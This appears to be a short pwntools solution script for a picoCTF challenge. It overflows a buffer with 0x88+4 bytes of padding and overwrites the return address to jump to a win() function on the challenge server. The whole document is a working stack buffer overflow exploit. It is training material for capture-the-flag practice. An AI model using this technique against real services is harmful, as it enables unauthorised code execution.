from pwn import *

# Windows buffer overflow works same as Linux!
offset_to_fill = 0x88 + 4  # address of the variable to overflow + 4 instruction pointer
win_addr = 0x0401530
io = remote('saturn.picoctf.net', 53073)
payload = b'A' * offset_to_fill + p32(win_addr)  # fill up the stuff first before overflowing to the return pointer, where we override it with win() call and its arguments
io.sendline(payload)
io.interactive()
